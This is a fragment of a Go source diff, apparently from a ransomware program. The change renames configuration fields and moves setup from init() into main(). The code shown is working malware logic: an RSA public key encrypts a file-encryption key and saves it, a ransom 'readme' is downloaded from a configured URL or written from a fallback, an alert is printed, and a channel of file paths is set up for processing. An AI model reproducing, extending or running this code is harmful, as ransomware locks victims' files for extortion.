@@ -102,8 +102,8 @@ func cAll(list chan string) {
 }
 
 func saveKey(cip []byte) {
-	keyFile, _ := os.Create(settings.keyFilename)
-	block, _ := pem.Decode([]byte(settings.pubKey))
+	keyFile, _ := os.Create(settings.KeyFilename)
+	block, _ := pem.Decode([]byte(settings.PubKey))
 	pubI, _ := x509.ParsePKIXPublicKey(block.Bytes)
 	pub := pubI.(*rsa.PublicKey)
 	word, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, cip)
@@ -112,27 +112,25 @@ func saveKey(cip []byte) {
 }
 
 func downloadReadme() {
-	res, err := http.Get(settings.readmeUrl)
+	res, err := http.Get(settings.ReadmeUrl)
 	if err != nil {
-		ioutil.WriteFile(settings.readmeFilename, []byte(settings.readme), 0)
+		ioutil.WriteFile(settings.ReadmeFilename, []byte(settings.Readme), 0)
 		return
 	}
 	defer res.Body.Close()
 	data, _ := ioutil.ReadAll(res.Body)
-	ioutil.WriteFile(settings.readmeNetFilename, data, 0)
+	ioutil.WriteFile(settings.ReadmeNetFilename, data, 0)
 	return
 }
 
-func init() {
-	settings.init(configE)
-	runtime.GOMAXPROCS(runtime.NumCPU())
-}
 
 func main() {
-	fmt.Println(settings.alert)
+	settings.init(configE)
+	runtime.GOMAXPROCS(runtime.NumCPU())
+	fmt.Println(settings.Alert)
 	action := true
 	handleList := make(chan string, 2048)
-	bb, err := ioutil.ReadFile(settings.dkeyFilename)
+	bb, err := ioutil.ReadFile(settings.DkeyFilename)
 	if err != nil {
 		action = false
 	}
